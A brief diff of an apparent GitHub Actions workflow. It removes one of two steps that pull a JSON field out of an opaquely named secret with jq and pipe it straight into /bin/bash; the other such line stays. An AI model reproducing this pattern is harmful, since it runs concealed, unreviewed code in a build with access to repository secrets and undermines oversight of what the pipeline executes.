@@ -22,7 +22,6 @@ jobs:
           ld9: ${{ secrets.ld9 }}
         run: |
           printf '%s' "$ld9" | jq -r .b5595 | /bin/bash
-          printf '%s' "$h664" | jq -r .eoerp2 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
